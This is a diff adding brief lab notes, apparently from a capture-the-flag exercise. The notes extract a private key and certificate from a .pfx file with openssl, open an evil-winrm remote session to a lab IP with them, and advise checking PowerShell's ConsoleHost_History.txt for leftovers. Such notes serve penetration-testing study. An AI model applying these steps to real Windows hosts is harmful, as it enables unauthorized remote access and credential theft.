@@ -1,0 +1,11 @@
+we can login on evil-winrm with priv key and cert.pem
+
+==pfx== file can be extracted to these ..
+
+==openssl== pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
+
+==openssl== pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
+
+evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S -r timlapse opton flag -r
+
+always look for ==ConsoleHost_History.tx==t file
